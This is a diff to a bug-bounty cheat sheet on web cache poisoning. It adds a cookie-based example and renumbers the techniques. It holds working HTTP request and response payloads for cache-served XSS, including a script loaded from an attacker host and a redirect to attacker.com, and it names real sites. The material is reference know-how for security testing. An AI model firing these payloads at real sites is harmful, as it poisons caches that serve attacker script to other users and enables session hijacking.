@@ -4,9 +4,9 @@
 The objective of web cache poisoning is to send a request that causes a harmful response that gets saved in the cache and served to other users.
 
 ## Where to find
-* Parameter with Cache (unkeyed)    
-* Header with Cache (unkeyed)       
-* Cookie with Cache (unkeyed) 
+* Parameter with Cache (unkeyed) and its value reflected in Response   
+* Header with Cache (unkeyed) and its value reflected in Response   
+* Cookie with Cache (unkeyed) and its value reflected in Response   
 
 ## Impact
 * Session Hijacking (Web Cache Poisoning + [Host Header Injection](https://github.com/Ch4ng3TheW0rld/AllAboutBugBounty/blob/master/Host%20Header%20Injection.md) + XSS)
@@ -14,7 +14,7 @@ The objective of web cache poisoning is to send a request that causes a harmful 
 
 ## How to exploit
 Note: Cache-Control: public, no-cache or X-cache: miss, hit
-1. Basic poisoning
+1. Basic Header poisoning
 ```
 GET / HTTP/1.1
 Host: www.vuln.com
@@ -39,7 +39,20 @@ Cache-Control: public, no-cache
 <img href="https://a.\"><script>alert(1)</script>a.png" />
 ```
 
-2. Seizing the Cache
+2. Basic Cookie poisoning
+```
+GET / HTTP/1.1
+Host: www.vuln.com
+Cookie: sid=a.\"><script>alert(1)</script>
+
+### Response:
+HTTP/1.1 200 OK
+X-Cache: miss, hit
+…
+<img href="https://a.\"><script>alert(1)</script>a.png" />
+```
+
+3. Seizing the Cache
 ```
 GET / HTTP/1.1
 Host: unity3d.com
@@ -54,7 +67,7 @@ Cache-Control: public, max-age=1800
 <script src="https://evil-website.com/x.js"></script>
 ```
 
-3. Selective poisoning
+4. Selective poisoning
 ```
 GET / HTTP/1.1
 Host: redacted.com
@@ -69,7 +82,7 @@ Vary: User-Agent, Accept-Encoding
 <link rel="canonical" href="https://a">a<iframe onload=alert(1)>
 ```
 
-4. Chaining Unkeyed Inputs 
+5. Chaining Unkeyed Inputs 
 - First step
 ```
 GET /en HTTP/1.1
@@ -102,7 +115,7 @@ HTTP/1.1 301 Moved Permanently
 Location: https://attacker.com/en
 ```
 
-5. Route Poisoning
+6. Route Poisoning
 ```
 GET / HTTP/1.1
 Host: www.goodhire.com
@@ -127,7 +140,7 @@ HTTP/1.1 200 OK
 <script>alert(document.domain)</script>
 ```
 
-6. Hidden Route Poisoning
+7. Hidden Route Poisoning
 ```
 GET / HTTP/1.1
 Host: blog.cloudflare.com
